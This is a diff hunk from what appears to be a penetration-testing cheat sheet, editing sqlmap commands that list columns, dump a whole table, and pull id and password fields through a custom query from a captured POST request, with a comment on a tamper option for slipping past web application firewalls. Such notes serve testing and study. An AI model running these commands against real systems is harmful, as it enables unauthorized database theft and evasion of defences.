@@ -381,7 +381,7 @@ Anthares101@kali:~$ sqlmap -D DB -T TABLE --columns -r post_request.txt
 Anthares101@kali:~$ sqlmap -D DB -T TABLE --dump --batch -r post_request.txt
 # Copy all the information of a certain table in a database
 
-Anthares101@kali:~$ sqlmap -D DB -T TABLE -C id,password,...,... --sql-query "select id,password,...,... from TABLE where COLUMN like PATTERN" -r post_request.txt
+Anthares101@kali:~$ sqlmap -D DB --sql-query "select id,password,...,... from TABLE where COLUMN like PATTERN" -r post_request.txt
 # Extracts the result of a specific query to a known table
 
 # The parameter --tamper=space2comment allows you to try to bypass certain firewalls (WAF)
